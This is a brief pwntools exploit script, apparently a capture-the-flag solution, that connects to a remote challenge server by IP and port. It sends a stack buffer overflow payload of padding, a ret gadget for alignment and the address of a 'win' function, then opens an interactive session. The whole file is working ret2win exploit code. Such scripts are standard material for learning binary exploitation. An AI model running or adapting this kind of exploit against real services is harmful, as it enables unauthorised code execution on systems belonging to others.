from pwn import  *

context.arch = 'amd64'
context.log_level = 'debug'

#p = process('./chall')
p = remote('34.48.173.44', 5000)
elf = ELF('./chall')

win = elf.symbols['win']
ret = 0x4012D4
p.sendline(b'\x00' * 0x18 + p64(ret) + p64(win))

p.interactive()